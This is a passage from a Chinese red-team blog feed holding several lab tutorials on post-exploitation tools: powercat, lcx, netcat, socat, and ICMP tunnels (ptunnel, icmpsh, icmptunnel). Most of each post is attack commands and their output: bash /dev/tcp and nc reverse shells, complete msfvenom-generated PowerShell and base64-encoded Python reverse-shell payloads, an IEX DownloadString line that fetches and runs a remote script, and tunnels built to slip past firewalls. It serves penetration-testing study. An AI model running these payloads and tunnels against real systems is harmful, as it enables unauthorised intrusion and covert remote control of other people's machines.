proxychains，可以直接使用 <code>sudo apt install proxychains</code> 进行安装，安装完成后，需要修改 proxychains 的配置文件</p><pre><code>vim /etc/proxychains4.conf</code></pre><p>来到配置文件最后一行，如果有之前配置好的代理，可以用 # 号注释掉，然后另起一行添加上我们的代理，添加内容为：</p><pre><code>socks5 127.0.0.1 4444</code></pre><p>修改后之后，按下<code>esc</code>，然后按下<code>:wq</code> 保存退出</p><p>之后使用下面的命令连接内网办公主机 192.168.7.110 的 3389 端口。</p><pre><code>proxychains4 rdesktop 192.168.7.110:3389 </code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh4.png"></p><p>可以看到动态转发要比本地转发自由度高出不少，借助动态转发可以访问到内网 Web 服务器能访问的所有地址、端口，没有了本地转发只能访问单个IP、端口的限制。</p><h1 id="0x05-SSH-隧道攻击的防御"><a href="#0x05-SSH-隧道攻击的防御" class="headerlink" title="0x05 SSH 隧道攻击的防御"></a>0x05 SSH 隧道攻击的防御</h1><p>对 SSH 进行双向访问控制策略可以避免这些问题，一方面只允许可信 IP 才能连接，一方面只允许连接到可信 IP。</p><blockquote><p>参考文章：</p><p><a href="https://baike.baidu.com/item/SSH/10407">https://baike.baidu.com/item/SSH/10407</a></p><p><a href="https://zhuanlan.zhihu.com/p/174782978">https://zhuanlan.zhihu.com/p/174782978</a><br>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;SSH 全称 &lt;code&gt;Secure Shell&lt;/code&gt;，从它的名字来看这个协议就比较安全。</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】8、powercat 的使用</title>
    <link href="https://www.teamssix.com/year/210601-155103.html"/>
    <id>https://www.teamssix.com/year/210601-155103.html</id>
    <published>2021-06-01T07:51:03.000Z</published>
    <updated>2021-06-01T08:01:13.069Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、下载安装-powercat"><a href="#1、下载安装-powercat" class="headerlink" title="1、下载安装 powercat"></a>1、下载安装 powercat</h2><p>powercat 可以视为 nc 的 powershell 版本，因此也可以和 nc 进行连接。</p><p>powercat 可在 github 进行下载，项目地址为：<a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><p>下载下来 powercat.ps1 文件后，直接导入即可</p><pre><code> Import-Module .\powercat.ps1</code></pre><p>如果提示未能加载指定模块，则可能是权限问题，可以参照之前写的 <a href="https://teamssix.com/year/210206-191859.html">【内网学习笔记】2、PowerShell</a> 文章中的方法对其赋予权限，即在管理员模式下运行以下命令</p><pre><code>Set-ExecutionPolicy Unrestricted</code></pre><p>之后就可以导入 powercat 了，导入成功后，输入 powercat -h 可以看到帮助信息。</p><p>如果没有权限，也可以直接下载远程文件进行绕过。</p><pre><code>IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;)</code></pre><p>不过由于 github 在国内可能会无法打开，因此可以使用 web 代理站点或者把 powercat.ps1 文件放到自己的服务器上进行下载。</p><h2 id="2、powercat-的使用"><a href="#2、powercat-的使用" class="headerlink" title="2、powercat 的使用"></a>2、powercat 的使用</h2><p>powercat 命令参数</p><pre><code>-l        监听模式-p        指定监听端口-e        指定启动进程的名称-v        显示详情-c        指定想要连接的 IP 地址-ep        返回 powershell-dns    使用 dns 通信-g        生成 payload-ge        生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload</code></pre><p>可以看到和 nc 的命令还是很相似的。</p><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>Kali 上的 nc 连接到靶机</p><pre><code>nc -v rhost rport</code></pre><pre><code>nc -v 172.16.214.21 4444</code></pre><p>靶机开启监听，等待 Kali 连接</p><pre><code>powercat -l -v -p lport -e cmd.exe</code></pre><pre><code>powercat -l -v -p 4444 -e cmd.exe</code></pre><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>Kali 上开启监听</p><pre><code>nc -lvp 4444</code></pre><p>靶机向 kali 发起连接</p><pre><code>powercat -c rhost -p rport -e cmd.exe</code></pre><pre><code>powercat -c 172.16.214.46 -p 4444 -e cmd.exe</code></pre><h3 id="返回-powershell"><a href="#返回-powershell" class="headerlink" title="返回 powershell"></a>返回 powershell</h3><p>攻击机上运行</p><pre><code>powercat -l -v -p lport</code></pre><pre><code>powercat -l -v -p 4444</code></pre><p>靶机上运行</p><pre><code>powercat -c rhost -p rport -v -ep</code></pre><pre><code>powercat -c 172.16.214.21 -p 4444 -v -ep</code></pre><h3 id="作为跳板使用"><a href="#作为跳板使用" class="headerlink" title="作为跳板使用"></a>作为跳板使用</h3><p>测试环境为：</p><pre><code>kali            172.16.214.47windows7    172.16.214.2windows10    172.16.214.21</code></pre><p>将 win7 作为跳板机，让 kali 通过 win7 连接到 windows10</p><p>在 win10 中执行以下命令</p><pre><code>powercat -l -v -p 4444 -e cmd.exe</code></pre><p>在 win7 中执行以下命令</p><pre><code>powercat -l -v -p 5555 -r tcp:172.16.214.21:4444</code></pre><p>最后在 kali 下连接 win7</p><pre><code>nc -v 172.16.214.2 5555</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_14-23-47.png"></p><h3 id="powercat-生成-payload"><a href="#powercat-生成-payload" class="headerlink" title="powercat 生成 payload"></a>powercat 生成 payload</h3><p>在攻击机上运行以下命令生成 shell.ps1 payload 文件</p><pre><code>powercat -l -p 4444 -e cmd -g &gt; shell.ps1</code></pre><p>将 shell.ps1 文件拷贝到目标主机上后，执行 shell.ps1 文件</p><p>之后在攻击机上运行以下命令即可获得 shell</p><pre><code>powercat -c rhost -p rport -v</code></pre><pre><code>powercat -c 172.16.214.21 -p 4444 -v </code></pre><p>反向连接也可以</p><p>在攻击机上生成 ps1 文件，并开启监听</p><pre><code>powercat -c rhost -p rport -ep -g &gt; shell.ps1</code></pre><pre><code>powercat -c 172.16.214.2 -p 4444 -ep -g &gt; shell.ps1</code></pre><pre><code>powercat -l -p 4444 -v</code></pre><p>之后在靶机上，运行 ps1 文件就会上线了，如果不想生成文件，也可以使用 -ge 生成经过编码的 payload</p><p>在攻击机上生成 payload，并开启监听</p><pre><code>powercat -c 172.16.214.2 -p 4444 -ep -ge</code></pre><pre><code>powercat -l -p 4444 -v</code></pre><p>在靶机上执行刚生成的 payload</p><pre><code>powershell -e payload</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_15-35-24.png"></p><h3 id="建立-dns-隧道连接"><a href="#建立-dns-隧道连接" class="headerlink" title="建立 dns 隧道连接"></a>建立 dns 隧道连接</h3><p>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。</p><p>在服务端上安装 dnscat ，以 kali 为例</p><pre><code>git clone https://github.com/iagox86/dnscat2.gitcd dnscat2/server/gem install bundlerbundle install</code></pre><p>命令运行完之后，执行以下命令开启服务端</p><pre><code>ruby dnscat2.rb powercat -e open --no-cache</code></pre><p>在靶机下，执行以下命令，建立 dns 隧道</p><pre><code>powercat -c 172.16.214.47 -p 53 -dns powercat -e cmd.exe</code></pre><p>此时，在 kali 上就能看到回连的会话了</p><pre><code>sessions                #    查看所有会话session -i 1         #    选择指定的会话进行交互</code></pre><p>不过实测，虽然能返回会话，但不能执行命令，暂不清楚原因是什么。</p><p>powercat 暂时就记录这些，其他的比如文件传输什么的就不记了，毕竟使用频率几乎为零，平时使用最多的可能还是拿它来反弹 shell，不过为什么不用 CS 或者 MSF 呢，不更香嘛。</p><blockquote><p>参考链接：</p><p><a href="https://blog.csdn.net/qq_32393893/article/details/108904697">https://blog.csdn.net/qq_32393893/article/details/108904697</a></p><p><a href="https://cloud.tencent.com/developer/article/1772183">https://cloud.tencent.com/developer/article/1772183</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、下载安装-powercat&quot;&gt;&lt;a href=&quot;#1、下载安装-powercat&quot; class=&quot;headerlink&quot; title=&quot;1、下载安装 powercat&quot;&gt;&lt;/a&gt;1、下载安装 powercat&lt;/h2&gt;&lt;p&gt;powercat 可以视为 nc 的</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】7、lcx、netcat和socat的使用</title>
    <link href="https://www.teamssix.com/year/210528-130449.html"/>
    <id>https://www.teamssix.com/year/210528-130449.html</id>
    <published>2021-05-28T05:04:49.000Z</published>
    <updated>2021-05-28T05:15:41.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、lcx-使用"><a href="#1、lcx-使用" class="headerlink" title="1、lcx 使用"></a>1、lcx 使用</h2><p>lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li>内网端口转发</li></ul><pre><code>内网失陷主机lcx.exe -slave rhost rport lhost lport公网代理主机lcx.exe -listen lport1 lport2</code></pre><pre><code>内网失陷主机lcx.exe -slave 123.123.123.123 4444 127.0.0.1 3389公网代理主机lcx.exe -listen 4444 5555</code></pre><p>在建立连接后，访问公网代理主机的 5555 端口就能访问到内网失陷主机的 3389 端口了。</p><ul><li>本地端口映射</li></ul><p>如果目标主机不能出网，这时可以利用内网中能够出网的主机，将其不能出网的主机端口映射到自身上，再借助端口转发到公网进行访问。</p><pre><code>lcx.exe -tran 53 &lt;目标主机 IP 地址&gt; 3389</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li>内网端口转发</li></ul><pre><code>内网失陷主机./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 &lt;公网主机 IP&gt; -p2 4444公网代理主机./portmap -m 2 -p1 4444 -h2 &lt;公网主机 IP&gt; -p2 5555</code></pre><p>此时访问公网主机 IP 的 5555 端口，就会访问到内网失陷主机的 22 端口了。</p><h2 id="2、netcat-使用"><a href="#2、netcat-使用" class="headerlink" title="2、netcat 使用"></a>2、netcat 使用</h2><p>nc 下载地址：<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><p>nc 全称 netcat，它的功能很多，这里简单记录下两个常用的功能，其他的比如文件传输、端口扫描等等的就不介绍了，毕竟平时使用频率有一说一还是比较少的。</p><pre><code>-l 开启监听状态-v 显示详细信息-p 指定监听的本地端口-k 客户端断掉连接时，服务端依然保持运行-e 将传入的信息以命令执行-n 直接使用 IP 地址，不进行 dns 解析过程</code></pre><h3 id="获取-banner-信息"><a href="#获取-banner-信息" class="headerlink" title="获取 banner 信息"></a>获取 banner 信息</h3><p>个人觉着最常用的功能，这个不仅可以用来查看 banner 信息，还能用来判断端口是否开放。</p><pre><code>nc -vv rhost rport</code></pre><pre><code>&gt; nc -v 172.16.214.43 22Connection to 172.16.214.43 port 22 [tcp/ssh] succeeded!SSH-2.0-OpenSSH_8.4p1 Debian-3</code></pre><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>个人觉着这个也是最常用的功能，可以使用 -e 指定 /bin/bash 进行反弹，也可以直接 -c 指定 bash 或者 cmd</p><p><strong>-e 指定反弹 shell</strong></p><pre><code># 失陷主机nc -lvp lport -e /bin/bash        # linux 主机nc -lvp lport -e c:\windows\system32\cmd.exe     # windows 主机# 控制端nc rhost rport</code></pre><pre><code># 失陷主机&gt; nc -lvp 4444 -e /bin/bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60628# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp/krb524] succeeded!whoamiroot</code></pre><p><strong>-c 指定反弹 shell</strong></p><pre><code># 失陷主机nc -lvp lprot -c bash    # linux 主机nc -lvp lport -c cmd     # windows 主机# 控制端nc rhost rport</code></pre><pre><code># 失陷主机&gt; nc -lvp 4444 -c bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60635# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp/krb524] succeeded!whoamiroot</code></pre><p><strong>结合其他语言进行反弹 shell</strong></p><pre><code># 失陷主机bash -i &gt;&amp; /dev/tcp/rhost/rport 0&gt;&amp;1# 控制端nc -lvp lprot</code></pre><pre><code># 失陷主机&gt; bash -i &gt;&amp; /dev/tcp/172.16.214.43/4444 0&gt;&amp;1# 控制端&gt; nc -lp 4444root@ubuntu:~# whoamiwhoamiroot</code></pre><p>除了 bash 也可以使用其他的语言进行反弹 shell，这里可以使用 msfvenom 生成反弹 shell，操作起来比较方便，使用 <code>msfvenom -l payload | grep &quot;cmd/&quot;</code>可查看可使用的 payload</p><p>比如使用 <code>cmd/windows/reverse_powershell</code> 这个 payload</p><pre><code># 控制端&gt; msfvenom -p cmd/windows/reverse_powershell lhost=172.16.214.43 lport=4444[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 1586 bytespowershell -w hidden -nop -c $a=&#39;172.16.214.43&#39;;$b=4444;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) &#123;    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) &#123;      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    &#125;    if ($esread.IsCompleted -and $esread.Result -ne 0) &#123;      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    &#125;    if ($s.DataAvailable) &#123;      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) &#123;          break;      &#125; else &#123;          $str=$e.GetString($nb,0,$r);          $is.write($str);      &#125;    &#125;    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) &#123;        break;    &#125;    if ($p.ExitCode -ne $null) &#123;        break;    &#125;&#125;&gt; nc -lvp 4444</code></pre><p>将生成的 payload 复制到失陷主机上运行，即可收到反弹回的 shell</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-05-28_12-36-45.png"></p><p>再比如使用 <code>cmd/unix/reverse_python</code> 这个payload</p><pre><code># 控制端&gt; msfvenom -p cmd/unix/reverse_python lhost=172.16.214.43 lport=4444[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 505 bytespython -c &quot;exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHNvY2tldCAgICwgc3VicHJvY2VzcyAgICwgb3M7ICAgICAgaG9zdD0iMTcyLjE2LjIxNC40MyI7ICAgICAgcG9ydD00NDQ0OyAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICBzLmNvbm5lY3QoKGhvc3QgICAsIHBvcnQpKTsgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsIDApOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgMSk7ICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAyKTsgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=&#39;)[0]))&quot;&gt; nc -lvp 4444</code></pre><p>同样将生成的 payload 复制到失陷主机上运行，即可收到反弹回来的 shell，当然前提是目标主机安装了 python</p><h2 id="3、socat-使用"><a href="#3、socat-使用" class="headerlink" title="3、socat 使用"></a>3、socat 使用</h2><p>socat 下载地址：<a href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a>，或者直接使用 <code>apt-get install socat</code> 安装，Mac 可使用 <code>brew install socat</code> 安装。</p><p>socat 全称 socket cat，可以视为 nc 的加强版，不过平时感觉 nc 也够用了，但是 nc 现在貌似会被杀软杀掉，而且貌似 nc 很久没更新了，反正多掌握点知识没坏处。</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p><strong>读取文件</strong></p><pre><code>&gt; socat - ./test.txt      # 相对路径读取test&gt; socat - /tmp/test.txt    # 绝对路径读取test</code></pre><p><strong>写入文件</strong></p><pre><code>&gt; echo &quot;hello world&quot; | socat - ./test.txt&gt; socat - ./test.txttesthello world</code></pre><h3 id="网络操作"><a href="#网络操作" class="headerlink" title="网络操作"></a>网络操作</h3><p><strong>连接远程端口</strong></p><pre><code>&gt; socat - TCP:172.16.214.1:22SSH-2.0-OpenSSH_7.4</code></pre><p><strong>监听端口</strong></p><pre><code>socat - TCP-LISTEN:8002</code></pre><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><strong>转发 TCP 端口</strong></p><p>个人觉着这个是比较常用到的功能，在使用 CS 做重定向器时，就可以使用 socat 进行端口的转发。</p><pre><code>socat TCP4-LISTEN:80,fork TCP4:123.123.123.123:80</code></pre><p>这样在访问当前主机的 80 端口时，就会访问到 123.123.123.123 的 80 端口了，也可以使用 -d 调整输出信息的详细程度，最多使用四个 d，推荐使用两个，即 -dd</p><pre><code>socat -dd TCP4-LISTEN:80,fork TCP4:123.123.123.123:80</code></pre><p><strong>转发 UDP 端口</strong></p><p>和上面一样，将 TCP 改成 UDP 即可</p><pre><code>socat UDP4-LISTEN:80,fork UDP4:123.123.123.123:80</code></pre><p><strong>NAT 映射</strong></p><p>通过 socat 可以将内网端口映射到公网上，不过这种场景还是更推荐用 frp</p><pre><code># 内网主机socat tcp:123.123.123.123:4444 tcp:127.0.0.1:3389# 公网主机socat tcp-listen:4444 tcp-listen:5555</code></pre><p>此时访问公网主机的 5555 端口就可以访问到内网主机的 3389 端口了</p><p>考虑到 socat 的其他功能平时也很少使用到，这里就不过多介绍了，网上相关文章也有很多，在此就不赘述了。</p><blockquote><p>参考链接：</p><p><a href="https://www.sqlsec.com/2019/10/nc.html">https://www.sqlsec.com/2019/10/nc.html</a></p><p><a href="https://www.hi-linux.com/posts/61543.html">https://www.hi-linux.com/posts/61543.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、lcx-使用&quot;&gt;&lt;a href=&quot;#1、lcx-使用&quot; class=&quot;headerlink&quot; title=&quot;1、lcx 使用&quot;&gt;&lt;/a&gt;1、lcx 使用&lt;/h2&gt;&lt;p&gt;lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap&lt;/p&gt;</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】6、ICMP隧道工具使用</title>
    <link href="https://www.teamssix.com/year/210407-183605.html"/>
    <id>https://www.teamssix.com/year/210407-183605.html</id>
    <published>2021-04-07T10:36:05.000Z</published>
    <updated>2021-04-07T11:30:27.165Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>在内网中，如果攻击者使用 HTTP、DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最常见的场景就是使用 ping 命令，而且一般防火墙都不会禁止 ping 数据包。</p><p>因此我们便可以将 TCP/UDP 数据封装到 ICMP 的 ping 数据包中，从而绕过防火墙的限制。</p><h2 id="2、建立-ICMP-隧道工具"><a href="#2、建立-ICMP-隧道工具" class="headerlink" title="2、建立 ICMP 隧道工具"></a>2、建立 ICMP 隧道工具</h2><p>用于建立 ICMP 隧道的工具常见有：ptunnel、icmpsh、icmptunnel 等</p><h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h3><p>ptunnel 全称 PingTunnel，Kali 下自带该工具，Linux 下安装过程如下：</p><pre><code>yum -y install byaccyum -y install flex bison#安装libpcap依赖库wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gztar -xzvf libpcap-1.9.0.tar.gzcd libpcap-1.9.0./configuremake &amp;&amp; make install#安装PingTunnelwget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gztar -xzvf PingTunnel-0.72.tar.gzcd PingTunnelmake &amp;&amp; make install</code></pre><p>ptunnel 常用命令介绍：</p><pre><code>-p: 指定跳板服务器 IP 地址-lp: 监听本地 TCP 端口-da: 指定访问目标的内网 IP 地址-dp: 指定访问目标的端口-m: 设置隧道最大并发数-v: 输入内容详细级别（-1到4，其中-1为无输出，4为全部输出）-udp: 切换使用UDP代替ICMP，代理将监听端口53（必须是 root 权限）-x: 设置隧道密码，防止滥用（客户端和代理端必须相同）</code></pre><p>目前有这样的一个场景，当前已经拿下了一台外网 Web Linux 服务器，想通过它利用 ICMP 协议连接内网的一台已经开启远程桌面的 Windows ，网络结构简化如下。</p><pre><code>Kali 攻击机       172.16.214.6 (外网)||Linux Web 跳板机  172.16.214.5  (外网)|                192.168.7.5   (内网)||Win RDP 目标机    192.168.7.110 (内网)</code></pre><p>在 Kali 攻击机上执行以下命令</p><pre><code>ptunnel -p 172.16.214.5 -lp 1080 -da 192.168.7.110 -dp 3389 -x teamssix</code></pre><pre><code>-p  指定跳板机外网IP-lp 指定本机的监听端口-da 指定目标机的内网IP-dp 指定目标机的端口-x 设置隧道密码</code></pre><p>在 Linux Web 跳板机上执行以下命令</p><pre><code>ptunnel -x teamssix</code></pre><p>之后访问 Kali 攻击机 172.16.214.6 的 1080 端口就会连接到 Win RDP 目标机 192.168.7.110 的 3389 端口了，不过实测发现这种方法有些不稳定。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_14-46-46.png"></p><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh 使用很简单，直接在 github 上下载，运行时不需要管理员权限，但是在使用时需要关闭本地系统的 ICMP 应答，不然 shell 的运行会不稳定。</p><pre><code>git clone https://github.com/inquisb/icmpsh.git #下载工具apt-get install python-impacket # 安装依赖，或者 pip2 install impacketsysctl -w net.ipv4.icmp_echo_ignore_all=1  #关闭本地ICMP应答</code></pre><p>icmpsh 常用命令介绍：</p><pre><code>-t host            发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在]-d milliseconds    请求时间间隔（毫秒）-o milliseconds    响应超时时间（毫秒）-s bytes           最大数据缓冲区大小（字节）</code></pre><p>目前有这样的一个场景，攻击机能通过 ICMP 协议访问到目标主机，但是目标上有防火墙，拒绝了敏感端口比如 22、3389 端口的访问，这个时候可以使用 icmpsh 利用 ICMP 协议建立反向 shell</p><pre><code>攻击机 IP：172.16.214.6目标机 IP：172.16.214.2</code></pre><p>在攻击机上运行：</p><pre><code>python2 icmpsh_m.py 172.16.214.6 172.16.214.2</code></pre><p>在目标机上运行</p><pre><code>./icmpsh.exe -t 172.16.214.6</code></pre><p>此时在攻击机上可以看到通过 icmp 协议建立的 shell</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_15-43-51.png"></p><h3 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h3><p> icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 上进行下载，值得注意的是该工具只有 Linux 版。</p><pre><code>git clone https://github.com/jamesbarlow/icmptunnel.gitcd icmptunnelmake</code></pre><p>目前有这样的一个场景，攻击者为 Linux，但由于目标存在状态防火墙或者使用了 NAT 导致无法获得 shell，此时可以通过 icmptunnel 绕过限制。</p><pre><code>攻击机 IP：172.16.214.6目标机 IP：172.16.214.5</code></pre><p>在攻击机上运行：</p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all        # 禁用 ICMP echo 回复，防止内核自己对ping包进行响应./icmptunnel -s    # 开启服务端模式</code></pre><p>在攻击机上新开启一个终端运行：</p><pre><code>/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0    # 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.1)</code></pre><p>在目标机上运行：</p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all./icmptunnel 172.16.214.6</code></pre><p>在目标机上新开启一个终端运行：</p><pre><code>/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0    # 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.2)</code></pre><p>至此，已经通过 ICMP 建立了一个点对点隧道。</p><p>在攻击机上，尝试通过 ssh 进行连接，可以看到通过刚才建立的隧道成功连接到目标机。</p><pre><code>ssh root@10.0.0.2</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_16-35-09.png"></p><blockquote><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/7875">https://xz.aliyun.com/t/7875</a></p><p><a href="https://www.freebuf.com/sectool/210450.html">https://www.freebuf.com/sectool/210450.html</a></p><p><a href="https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/">https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;在内网中，如果攻击者使用 HTTP、DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】域内主机端口探测的一些方法总结</title>
    <link href="https://www.teamssix.com/year/210317-201858.html"/>
    <id>https://www.teamssix.com/year/210317-201858.html</id>
    <published>2021-03-17T12:18:58.000Z</published>
    <updated>2021-07-28T05:17:57.038Z</updated>
    
